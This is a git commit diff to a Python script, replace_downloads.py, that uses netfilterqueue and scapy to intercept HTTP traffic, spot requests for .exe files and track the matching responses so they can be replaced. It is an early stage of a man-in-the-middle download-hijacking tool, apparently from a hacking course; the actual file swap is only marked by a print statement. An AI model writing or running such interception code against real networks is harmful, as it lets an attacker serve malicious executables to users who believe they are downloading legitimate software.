5b7b801ff90aa220b2730b6a70910c85ddf499b9
root <root@localhost.localdomain>
2019-07-23 08:33:16 -0400

    File Interceptor with .exe filter

--- FileInterceptor/replace_downloads.py
+++ FileInterceptor/replace_downloads.py
@@ -2,10 +2,21 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list = []
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())#convert packet to scapy packet
     if scapy_packet.haslayer(scapy.Raw):#Raw layer contain the http data
-        print(scapy_packet.show())
+        if scapy_packet[scapy.TCP].dport == 80:
+            if ".exe" in scapy_packet[scapy.Raw].load:
+                print("[+] exe Request")
+                ack_list.append(scapy_packet[scapy.TCP].ack)
+                #print(scapy_packet.show())
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(scapy_packet[scapy.TCP].seq)
+                print("[+] Replacing file")
+                #print(scapy_packet.show())
 
     packet.accept()
 
